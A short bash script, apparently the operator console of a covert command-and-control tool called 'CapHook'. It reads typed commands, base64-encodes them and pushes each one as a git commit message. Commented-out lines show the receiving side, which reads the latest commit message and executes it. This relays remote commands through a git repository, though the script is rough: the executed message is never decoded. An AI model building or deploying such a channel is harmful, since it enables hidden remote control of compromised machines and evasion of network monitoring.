#!/bin/bash

while true; do
    echo "CapHook>"
    read command
    encode=$(echo ${command} | base64)
    echo ${encode}
    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-15} | head -n 1)
    git add .
    git commit -m ${encode}
    git push
#    commit=$(git log --pretty=oneline --abbrev-commit | awk '{print $1}' | head -n 1)
#    commit_msg=$(git log --format=%B -n 1 $commit)
#    exec $commit_msg
done
